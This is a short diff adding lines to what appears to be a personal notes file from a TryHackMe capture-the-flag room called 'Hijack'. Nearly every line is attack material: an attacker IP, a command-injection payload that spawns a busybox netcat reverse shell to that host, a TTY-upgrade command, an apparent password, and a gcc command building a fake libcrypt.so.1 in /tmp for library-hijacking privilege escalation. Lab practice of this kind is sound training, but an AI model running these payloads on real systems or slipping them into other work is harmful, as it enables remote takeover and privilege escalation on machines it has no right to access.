@@ -1,0 +1,6 @@
+10.9.1.158
+$(busybox nc 10.9.1.158 4445 -e /bin/bash)
+SHELL=/bin/bash script -q /dev/null
+N3v3rG0nn4G1v3Y0uUp
+~/Documents/CTF/TryHackMe/Hijack
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/kze/Documents/CTF/TryHackMe/Hijack/hijack.c
